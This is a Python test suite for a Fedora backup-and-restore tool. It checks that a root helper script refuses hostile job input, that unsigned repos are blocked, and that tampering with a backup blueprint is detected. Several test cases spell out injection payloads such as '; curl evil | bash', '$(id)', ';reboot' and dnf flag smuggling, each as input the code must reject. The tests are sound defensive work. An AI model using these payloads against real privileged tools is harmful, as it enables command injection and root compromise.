#!/usr/bin/env python3
"""
Security tests for the restore path.

Two boundaries are covered:

1. priv.sh restore verbs. priv.sh runs as root and is handed a jobs file written
   by an unprivileged caller, so every argument is hostile input. These tests
   assert the verbs refuse bad input *before* touching the system, so they are
   safe to run unprivileged: a rejection is the expected result either way.

2. Blueprint integrity. A blueprint drives root package installs and /etc writes,
   so a restore must notice when one has been modified since it was written.
"""

from __future__ import annotations

import base64
import os
import shutil
import subprocess
import tempfile
import unittest
from pathlib import Path

ROOT = Path(__file__).resolve().parents[1]
PRIV = ROOT / "lib" / "core" / "priv.sh"
BACKUP = ROOT / "lib" / "plugins" / "backup.sh"


def b64(s: str) -> str:
    return base64.b64encode(s.encode()).decode()


@unittest.skipIf(shutil.which("bash") is None, "bash required")
class TestPrivRestoreVerbs(unittest.TestCase):
    """Every one of these must be refused, and refused before any action."""

    def setUp(self) -> None:
        self._dir = tempfile.TemporaryDirectory()
        self.tmp = Path(self._dir.name)
        self.src = self.tmp / "src"
        self.src.mkdir()
        (self.src / "a.conf").write_text("x=1\n", encoding="utf-8")

    def tearDown(self) -> None:
        self._dir.cleanup()

    def run_job(self, line: str) -> str:
        jobs = self.tmp / "jobs"
        jobs.write_text(line + "\n", encoding="utf-8")
        jobs.chmod(0o600)
        p = subprocess.run(["bash", str(PRIV), str(jobs)], capture_output=True, text=True, timeout=60)
        return p.stdout + p.stderr

    def assertRefused(self, out: str, needle: str) -> None:
        self.assertIn(needle, out)
        # Nothing may have been written on a rejected job.
        self.assertNotIn("installed ", out)

    def test_destination_must_come_from_the_allowlist(self) -> None:
        out = self.run_job(f"restore_etc_tree /etc/cron.d {b64(str(self.src))}")
        self.assertRefused(out, "unknown destination key")

    def test_destination_key_cannot_traverse(self) -> None:
        out = self.run_job(f"restore_etc_tree ../../etc {b64(str(self.src))}")
        self.assertRefused(out, "unknown destination key")

    def test_source_must_be_owned_by_the_caller(self) -> None:
        """Otherwise `restore_etc_tree sysctl /root` publishes root's files."""
        out = self.run_job(f"restore_etc_tree sysctl {b64('/root')}")
        self.assertRefused(out, "not owned by the caller")

    def test_root_owned_etc_is_refused_as_a_source(self) -> None:
        out = self.run_job(f"restore_etc_tree sysctl {b64('/etc')}")
        self.assertRefused(out, "not owned by the caller")

    def test_symlinked_source_is_refused(self) -> None:
        link = self.tmp / "link"
        link.symlink_to("/etc")
        out = self.run_job(f"restore_etc_tree sysctl {b64(str(link))}")
        self.assertRefused(out, "not owned by the caller")

    def test_traversal_in_source_is_refused(self) -> None:
        out = self.run_job(f"restore_etc_tree sysctl {b64(str(self.tmp) + '/../../etc')}")
        self.assertRefused(out, "not owned by the caller")

    def test_unencoded_path_is_refused(self) -> None:
        out = self.run_job(f"restore_etc_tree sysctl {self.src}")
        self.assertRefused(out, "malformed source argument")

    def test_encoded_newline_is_refused(self) -> None:
        """A newline would let one job line smuggle in a second."""
        payload = b64("/tmp\nevil")
        out = self.run_job(f"restore_etc_tree sysctl {payload}")
        self.assertRefused(out, "malformed source argument")

    def test_grub_rejects_a_file_that_is_not_grub_config(self) -> None:
        bogus = self.tmp / "notgrub"
        bogus.write_text("[repo]\n", encoding="utf-8")
        out = self.run_job(f"restore_grub {b64(str(bogus))}")
        self.assertRefused(out, "does not look like")

    def test_grub_rejects_a_source_it_does_not_own(self) -> None:
        out = self.run_job(f"restore_grub {b64('/etc/default/grub')}")
        self.assertRefused(out, "not owned by the caller")

    def test_a_path_containing_spaces_survives_the_protocol(self) -> None:
        """Backups live on removable drives with names like 'John's Drive'."""
        spaced = self.tmp / "sp ace"
        spaced.mkdir()
        (spaced / "a.conf").write_text("x=1\n", encoding="utf-8")
        out = self.run_job(f"restore_etc_tree sysctl {b64(str(spaced))}")
        # Reaches the copy stage rather than being rejected as malformed.
        self.assertNotIn("malformed source argument", out)
        self.assertNotIn("not owned by the caller", out)


@unittest.skipIf(shutil.which("bash") is None, "bash required")
class TestRepoPolicy(unittest.TestCase):
    """A restored .repo installs packages whose scriptlets run as root."""

    def setUp(self) -> None:
        self._dir = tempfile.TemporaryDirectory()
        self.tmp = Path(self._dir.name)

    def tearDown(self) -> None:
        self._dir.cleanup()

    def is_safe(self, body: str) -> bool:
        f = self.tmp / "t.repo"
        f.write_text(body, encoding="utf-8")
        script = f"log(){{ :; }}\nsource <(sed -n '/^_repo_file_is_safe()/,/^}}/p' {PRIV})\n_repo_file_is_safe \"{f}\""
        return subprocess.run(["bash", "-c", script], capture_output=True).returncode == 0

    def test_signed_repo_with_a_key_is_accepted(self) -> None:
        self.assertTrue(self.is_safe("[r]\nbaseurl=https://x/\ngpgcheck=1\ngpgkey=https://x/key\n"))

    def test_gpgcheck_disabled_is_refused(self) -> None:
        self.assertFalse(self.is_safe("[r]\nbaseurl=http://x/\ngpgcheck=0\n"))

    def test_missing_gpgkey_is_refused(self) -> None:
        self.assertFalse(self.is_safe("[r]\nbaseurl=https://x/\ngpgcheck=1\n"))

    def test_any_unsigned_section_taints_the_file(self) -> None:
        self.assertFalse(self.is_safe("[a]\ngpgcheck=1\ngpgkey=https://x/k\n\n[b]\nbaseurl=http://y/\ngpgcheck=0\n"))

    def test_rpmfusion_repo_filenames_are_recognised(self) -> None:
        script = (
            f"source <(sed -n '/^_is_rpmfusion_repo_file()/,/^}}/p' {PRIV})\n"
            "ok=0; bad=0\n"
            "for n in rpmfusion-free.repo rpmfusion-nonfree-updates.repo "
            "rpmfusion-nonfree-nvidia-driver.repo; do\n"
            '  _is_rpmfusion_repo_file "$n" || exit 1\n'
            "done\n"
            "for n in google-chrome.repo fedora.repo cursor.repo; do\n"
            '  _is_rpmfusion_repo_file "$n" && exit 1\n'
            "done\n"
            "true\n"
        )
        p = subprocess.run(["bash", "-c", script], capture_output=True, text=True)
        self.assertEqual(p.returncode, 0, p.stderr)

    def test_rpmfusion_release_urls_are_https_and_versioned(self) -> None:
        script = (
            f"source <(sed -n '/^_rpmfusion_release_rpm_urls()/,/^}}/p' {PRIV})\n"
            '_rpmfusion_release_rpm_urls 44\n'
            '_rpmfusion_release_rpm_urls bad && exit 1\n'
            "true\n"
        )
        p = subprocess.run(["bash", "-c", script], capture_output=True, text=True)
        self.assertEqual(p.returncode, 0, p.stderr)
        lines = [ln for ln in p.stdout.splitlines() if ln]
        self.assertEqual(len(lines), 2)
        for url in lines:
            self.assertTrue(url.startswith("https://mirrors.rpmfusion.org/"), url)
            self.assertTrue(url.endswith(".noarch.rpm"), url)
        joined = "\n".join(lines)
        self.assertIn("rpmfusion-free-release-44", joined)
        self.assertIn("rpmfusion-nonfree-release-44", joined)

    def test_restore_does_not_copy_rpmfusion_repos_without_keys(self) -> None:
        """Copying rpmfusion-*.repo leaves gpgkey=file:///… pointing at
        files the *-release RPM has not installed yet; dnf then fails GPG."""
        priv = PRIV.read_text(encoding="utf-8")
        self.assertIn("_rpmfusion_install_release", priv)
        self.assertIn("deferred $dest_base", priv)
        self.assertIn("supplies GPG keys", priv)

    def test_codecs_install_swaps_fedora_ffmpeg_free(self) -> None:
        """`dnf install ffmpeg` conflicts with Fedora's ffmpeg-free."""
        priv = PRIV.read_text(encoding="utf-8")
        self.assertIn("codecs_install)", priv)
        self.assertIn("dnf swap -y ffmpeg-free ffmpeg", priv)
        idx = priv.find("codecs_install)")
        block = priv[idx : idx + 1600]
        self.assertIn("_rpmfusion_install_release", block)
        self.assertIn("--allowerasing", block)


@unittest.skipIf(shutil.which("bash") is None, "bash required")
class TestBlueprintIntegrity(unittest.TestCase):
    def setUp(self) -> None:
        self._dir = tempfile.TemporaryDirectory()
        self.bp = Path(self._dir.name) / "blueprint"
        for d in ("manifests", "config/etc/sysctl.d", "projects/app"):
            (self.bp / d).mkdir(parents=True)
        (self.bp / "manifests/dnf-user-packages.txt").write_text("firefox\n", encoding="utf-8")
        (self.bp / "config/etc/sysctl.d/99.conf").write_text("vm.swappiness=10\n", encoding="utf-8")
        (self.bp / "projects/app/main.py").write_text("print(1)\n", encoding="utf-8")
        self.write_manifest()

    def tearDown(self) -> None:
        self._dir.cleanup()

    def _bash(self, body: str) -> subprocess.CompletedProcess:
        return subprocess.run(
            ["bash", "-c", f"source {BACKUP} 2>/dev/null\n{body}"],
            capture_output=True,
            text=True,
            timeout=120,
            env={**os.environ, "HOME": str(self.bp.parent)},
        )

    def write_manifest(self) -> None:
        p = self._bash(f'_write_backup_manifest "{self.bp}"')
        self.assertEqual(p.returncode, 0, p.stderr)

    def verify(self) -> tuple[int, int, int]:
        """Returns (rc, privileged_problems, userdata_problems)."""
        p = self._bash(
            f'r=$(mktemp); _verify_backup_manifest "{self.bp}" "$r"; rc=$?\n'
            "pv=0; ov=0\n"
            'while IFS= read -r l; do [[ -n "$l" ]] || continue\n'
            '  if _manifest_path_is_privileged "${l%%:*}"; then pv=$((pv+1)); else ov=$((ov+1)); fi\n'
            'done < "$r"\n'
            'echo "$rc $pv $ov"'
        )
        rc, pv, ov = p.stdout.strip().split()
        return int(rc), int(pv), int(ov)

    def test_intact_blueprint_verifies(self) -> None:
        self.assertEqual(self.verify(), (0, 0, 0))

    def test_manifest_is_not_world_readable(self) -> None:
        self.assertEqual((self.bp / "MANIFEST.sha256").stat().st_mode & 0o077, 0)

    def test_tampering_with_a_root_input_is_flagged_privileged(self) -> None:
        (self.bp / "manifests/dnf-user-packages.txt").write_text("firefox\n--nogpgcheck\n", encoding="utf-8")
        rc, priv, other = self.verify()
        self.assertEqual(rc, 1)
        self.assertEqual((priv, other), (1, 0))

    def test_tampering_with_etc_content_is_flagged_privileged(self) -> None:
        (self.bp / "config/etc/sysctl.d/99.conf").write_text("kernel.x=1\n", encoding="utf-8")
        _rc, priv, _other = self.verify()
        self.assertEqual(priv, 1)

    def test_added_file_is_detected(self) -> None:
        (self.bp / "manifests/rogue.repo").write_text("[evil]\ngpgcheck=0\n", encoding="utf-8")
        rc, priv, _other = self.verify()
        self.assertEqual(rc, 1)
        self.assertEqual(priv, 1)

    def test_deleted_file_is_detected(self) -> None:
        (self.bp / "config/etc/sysctl.d/99.conf").unlink()
        rc, priv, _other = self.verify()
        self.assertEqual(rc, 1)
        self.assertEqual(priv, 1)

    def test_user_data_change_is_not_flagged_privileged(self) -> None:
        (self.bp / "projects/app/main.py").write_text("print(2)\n", encoding="utf-8")
        rc, priv, other = self.verify()
        self.assertEqual(rc, 1)
        self.assertEqual((priv, other), (0, 1))

    def test_regenerating_the_summary_does_not_break_verification(self) -> None:
        """BACKUP_SUMMARY.txt is rebuilt for display, so it cannot be checksummed."""
        (self.bp / "BACKUP_SUMMARY.txt").write_text("rebuilt\n", encoding="utf-8")
        self.assertEqual(self.verify()[0], 0)

    def test_restore_report_does_not_break_reverification(self) -> None:
        (self.bp / "RESTORE_REPORT.txt").write_text("report\n", encoding="utf-8")
        self.assertEqual(self.verify()[0], 0)

    def test_blueprint_still_verifies_after_being_restored_once(self) -> None:
        """A restore drops its log and report into the blueprint it read."""
        for name in (
            "RESTORE_LOG.txt",
            "RESTORE_REPORT.txt",
            "BACKUP_SUMMARY.txt",
            "BACKUP_MANIFEST.md",
        ):
            (self.bp / name).write_text("written by a restore\n", encoding="utf-8")
        self.assertEqual(self.verify(), (0, 0, 0))

    def test_added_uppercase_file_does_not_taint_the_whole_report(self) -> None:
        """A top-level uppercase name sorts before the lowercase directories
        under C collation but after them under most UTF-8 locales. If the
        comparison is not pinned to one collation, every legitimately listed
        file is reported as unlisted and an intact blueprint reads as fully
        rewritten — including its privileged parts, which blocks all restores.
        """
        (self.bp / "EXTRA_NOTES.txt").write_text("added later\n", encoding="utf-8")
        rc, priv, other = self.verify()
        self.assertEqual(rc, 1)
        # Exactly one extra, and it is not a file a restore feeds to root.
        self.assertEqual((priv, other), (0, 1))

    def test_blueprint_without_a_manifest_reports_rc2(self) -> None:
        (self.bp / "MANIFEST.sha256").unlink()
        self.assertEqual(self.verify()[0], 2)


@unittest.skipIf(shutil.which("bash") is None, "bash required")
class TestPackageNameValidation(unittest.TestCase):
    """Names out of a backup become dnf arguments running as root."""

    def check(self, name: str) -> bool:
        script = f"source {BACKUP} 2>/dev/null\n_valid_pkg_name {name!r}"
        return subprocess.run(["bash", "-c", script], capture_output=True).returncode == 0

    def test_ordinary_names_pass(self) -> None:
        for n in ("firefox", "kernel-devel", "python3.12", "gcc-c++", "7zip"):
            self.assertTrue(self.check(n), n)

    def test_injection_attempts_are_rejected(self) -> None:
        for n in (
            "--installroot=/tmp/x",
            "--nogpgcheck",
            "-y",
            "/tmp/evil.rpm",
            "*",
            "; curl evil | bash",
            "a b",
            "$(id)",
            "",
        ):
            self.assertFalse(self.check(n), n)


@unittest.skipIf(shutil.which("bash") is None, "bash required")
class TestCatalogInstallSafety(unittest.TestCase):
    """The catalog drives downloads that are executed or installed as root."""

    CATALOG = ROOT / "lib" / "core" / "catalog.sh"

    def _fn(self, call: str) -> bool:
        script = f"source {self.CATALOG} 2>/dev/null\n{call}"
        return subprocess.run(["bash", "-c", script], capture_output=True).returncode == 0

    def test_https_is_required(self) -> None:
        self.assertTrue(self._fn('_catalog_require_https "https://ollama.com/install.sh"'))

    def test_plain_http_is_refused(self) -> None:
        """These URLs are piped to a shell or installed as root."""
        for url in ("http://evil/x.sh", "ftp://x/y", "file:///etc/passwd", "//evil/x"):
            self.assertFalse(self._fn(f'_catalog_require_https "{url}"'), url)

    def test_package_names_reaching_dnf_are_validated(self) -> None:
        self.assertTrue(self._fn('_catalog_valid_pkg_name "kernel-devel"'))
        for bad in ("--nogpgcheck", "-y", "; id", "/tmp/e.rpm", "a b", ""):
            self.assertFalse(self._fn(f'_catalog_valid_pkg_name "{bad}"'), bad)

    def test_no_root_shell_is_ever_constructed(self) -> None:
        """A `pkexec bash -c` with an interpolated path is a root injection."""
        for path in (
            ROOT / "lib" / "core" / "catalog.sh",
            ROOT / "lib" / "plugins" / "backup.sh",
            ROOT / "lib" / "core" / "apply.sh",
            ROOT / "lib" / "plugins" / "health.sh",
        ):
            text = path.read_text(encoding="utf-8")
            self.assertNotIn("pkexec bash -c", text, f"{path.name} builds a root shell")
            self.assertNotIn("pkexec sh -c", text, f"{path.name} builds a root shell")

    def test_local_rpm_installs_verify_signatures(self) -> None:
        """dnf's localpkg_gpgcheck defaults to false, so an unsigned RPM would
        otherwise run its %post scriptlet as root."""
        catalog = self.CATALOG.read_text(encoding="utf-8")
        # No direct `pkexec dnf install` of a downloaded file.
        self.assertNotIn("pkexec dnf install -y \"$rpm_tmp\"", catalog)
        self.assertIn("_catalog_install_rpm", catalog)
        priv = PRIV.read_text(encoding="utf-8")
        self.assertIn("localpkg_gpgcheck=1", priv)
        # Generic catalog downloads still go through the signed verb.
        self.assertIn("_catalog_install_rpm", catalog)
        self.assertIn("install_local_rpm", catalog)

    def test_cursor_cdn_rpm_is_a_separate_unsigned_path(self) -> None:
        """Cursor's production CDN RPMs are unsigned; that exception must not
        weaken install_local_rpm, and must still refuse a non-Cursor payload."""
        priv = PRIV.read_text(encoding="utf-8")
        catalog = self.CATALOG.read_text(encoding="utf-8")
        self.assertIn("_install_cursor_rpm", priv)
        self.assertNotIn("cursor_rpm|install_local_rpm)", priv)
        self.assertIn("%{NAME}", priv)
        self.assertIn("%{VENDOR}", priv)
        self.assertIn("localpkg_gpgcheck=$gpg", priv)
        # Catalog fallback must use the Cursor verb, not the signed-only one.
        self.assertIn('_catalog_priv cursor_rpm', catalog)

    def test_cursor_rpm_refuses_a_non_rpm_payload(self) -> None:
        with tempfile.TemporaryDirectory() as d:
            fake = Path(d) / "not-cursor.rpm"
            fake.write_text("not an rpm\n", encoding="utf-8")
            jobs = Path(d) / "jobs"
            jobs.write_text(f"cursor_rpm {fake}\n", encoding="utf-8")
            jobs.chmod(0o600)
            out = subprocess.run(
                ["bash", str(PRIV), str(jobs)], capture_output=True, text=True, timeout=60
            )
            combined = out.stdout + out.stderr
            self.assertNotEqual(out.returncode, 0)
            self.assertIn("refusing package", combined)
            self.assertIn("expected cursor", combined)
            self.assertNotIn("dnf install", combined)

    def test_priv_helper_accepts_the_generic_rpm_verb(self) -> None:
        with tempfile.TemporaryDirectory() as d:
            jobs = Path(d) / "jobs"
            jobs.write_text(f"install_local_rpm {d}/absent.rpm\n", encoding="utf-8")
            jobs.chmod(0o600)
            out = subprocess.run(
                ["bash", str(PRIV), str(jobs)], capture_output=True, text=True, timeout=60
            )
            combined = out.stdout + out.stderr
            self.assertNotIn("Unknown job", combined)
            self.assertIn("missing file", combined)

    def test_catalog_does_not_call_dnf_or_snap_via_pkexec(self) -> None:
        catalog = self.CATALOG.read_text(encoding="utf-8")
        self.assertNotIn("pkexec dnf", catalog)
        self.assertNotIn("pkexec snap", catalog)
        self.assertIn("_catalog_priv dnf_install_pkg", catalog)
        self.assertIn("_catalog_priv snap_install", catalog)


@unittest.skipIf(shutil.which("bash") is None, "bash required")
class TestPrivSectionResults(unittest.TestCase):
    """A Cursor CDN failure must not mark a successful DNF upgrade as failed."""

    APPLY = ROOT / "lib" / "core" / "apply.sh"

    def section_ec(self, log_text: str | None, section: str, fallback: str = "9") -> str:
        with tempfile.TemporaryDirectory() as d:
            if log_text is not None:
                Path(d, "priv.log").write_text(log_text, encoding="utf-8")
            script = f"""
source {self.APPLY}
RUN_LOG_DIR={d}
priv_section_ec {section} {fallback}
"""
            p = subprocess.run(["bash", "-c", script], capture_output=True, text=True, timeout=30)
            self.assertEqual(p.returncode, 0, p.stderr)
            return p.stdout.strip()

    def test_cursor_fail_leaves_dnf_ok(self) -> None:
        log = "#result dnf_upgrade ok\n#result akmods_wait ok\n#result cursor_rpm fail\n"
        self.assertEqual(self.section_ec(log, "dnf"), "0")
        self.assertEqual(self.section_ec(log, "cursor"), "1")

    def test_missing_log_uses_fallback(self) -> None:
        self.assertEqual(self.section_ec(None, "cursor", "1"), "1")
        self.assertEqual(self.section_ec(None, "dnf", "0"), "0")


@unittest.skipIf(shutil.which("bash") is None, "bash required")
class TestPrivBatchRestoreVerbs(unittest.TestCase):
    """New restore verbs must refuse hostile input before touching the system."""

    def setUp(self) -> None:
        self._dir = tempfile.TemporaryDirectory()
        self.tmp = Path(self._dir.name)

    def tearDown(self) -> None:
        self._dir.cleanup()

    def run_job(self, line: str) -> str:
        jobs = self.tmp / "jobs"
        jobs.write_text(line + "\n", encoding="utf-8")
        jobs.chmod(0o600)
        p = subprocess.run(["bash", str(PRIV), str(jobs)], capture_output=True, text=True, timeout=60)
        return p.stdout + p.stderr

    def test_dnf_install_pkg_refuses_flags(self) -> None:
        out = self.run_job("dnf_install_pkg --nogpgcheck")
        self.assertIn("refusing name", out)
        self.assertIn("#result dnf_install_pkg fail", out)
        self.assertNotIn("Unknown job", out)

    def test_dnf_install_list_refuses_root_owned_source(self) -> None:
        out = self.run_job(f"dnf_install_list user {b64('/etc/passwd')}")
        self.assertIn("not owned by the caller", out)
        self.assertIn("#result dnf_install_list:user fail", out)

    def test_dnf_install_list_ignores_flag_names(self) -> None:
        lst = self.tmp / "pkgs.txt"
        lst.write_text("--nogpgcheck\n-y\n/tmp/evil.rpm\n", encoding="utf-8")
        out = self.run_job(f"dnf_install_list user {b64(str(lst))}")
        self.assertIn("ignoring invalid package name", out)
        self.assertIn("empty list", out)
        self.assertIn("#result dnf_install_list:user ok", out)
        self.assertNotIn("dnf install -y --nogpgcheck", out)

    def test_usermod_refuses_a_different_user(self) -> None:
        out = self.run_job("usermod_add_groups nosuchuser12345 dialout")
        self.assertIn("refusing user", out)
        self.assertNotIn("usermod -aG", out)

    def test_usermod_skips_wheel(self) -> None:
        me = subprocess.check_output(["id", "-un"], text=True).strip()
        out = self.run_job(f"usermod_add_groups {me} wheel")
        self.assertIn("skipped privileged group wheel", out)
        self.assertNotIn(f"usermod -aG wheel {me}", out)

    def test_set_locale_refuses_injection(self) -> None:
        out = self.run_job("set_locale en_GB.UTF-8;reboot")
        self.assertIn("refusing", out)
        self.assertNotIn("localectl set-locale", out)

    def test_set_keymap_refuses_injection(self) -> None:
        out = self.run_job("set_keymap gb;id")
        self.assertIn("refusing", out)
        self.assertNotIn("localectl set-keymap", out)

    def test_restore_does_not_prompt_per_privileged_step(self) -> None:
        text = BACKUP.read_text(encoding="utf-8")
        for needle in (
            "pkexec dnf",
            "pkexec snap",
            "pkexec usermod",
            "pkexec localectl",
            "pkexec xargs",
        ):
            self.assertNotIn(needle, text, needle)
        self.assertIn("_restore_run_priv_batch", text)
        self.assertIn("_restore_unwind_userspace", text)
        self.assertIn("_restore_init_cancel_undo", text)

    def test_cancel_flag_skips_remaining_priv_jobs(self) -> None:
        flag = self.tmp / "cancel"
        flag.write_text("1", encoding="utf-8")
        jobs = self.tmp / "jobs"
        jobs.write_text(
            f"#env URSTACK_RESTORE_CANCEL={flag}\ndnf_install_pkg firefox\n",
            encoding="utf-8",
        )
        jobs.chmod(0o600)
        p = subprocess.run(["bash", str(PRIV), str(jobs)], capture_output=True, text=True, timeout=60)
        out = p.stdout + p.stderr
        self.assertIn("skipped (restore cancelled)", out)
        self.assertNotIn("dnf install firefox", out)
        self.assertNotIn("Unknown job", out)

    def test_session_unwind_is_a_known_job(self) -> None:
        out = self.run_job("restore_session_unwind")
        self.assertNotIn("Unknown job", out)


if __name__ == "__main__":
    unittest.main()
